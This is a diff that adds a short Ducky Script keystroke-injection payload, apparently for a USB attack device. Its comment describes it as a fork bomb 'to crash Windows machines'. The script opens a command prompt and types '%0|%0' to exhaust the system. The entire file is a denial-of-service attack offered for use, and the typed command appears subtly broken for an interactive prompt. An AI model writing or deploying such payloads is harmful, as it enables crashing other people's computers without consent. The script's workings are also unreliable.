@@ -1,0 +1,8 @@
+REM Forkbomb to crash Windows machines
+DEFAULT_DELAY 500
+CTRL ESC
+STRING cmd
+ENTER
+STRING %0|%0
+REM Test this ^
+ENTER
